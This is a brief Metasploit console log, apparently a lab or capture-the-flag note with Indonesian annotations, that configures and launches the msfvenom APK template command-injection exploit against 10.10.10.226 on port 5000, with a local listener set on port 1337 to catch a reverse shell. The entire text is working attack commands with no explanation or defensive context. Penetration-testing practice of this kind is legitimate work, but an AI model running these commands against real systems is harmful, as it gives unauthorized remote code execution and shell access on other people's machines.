# msfconsole 

rhost == target
lhost == ip kita

msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set rhost 10.10.10.226
rhost => 10.10.10.226
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set rport 5000
rport => 5000
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.16.23
lhost => 10.10.16.23
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lport 1337
lport => 1337
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > 
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit
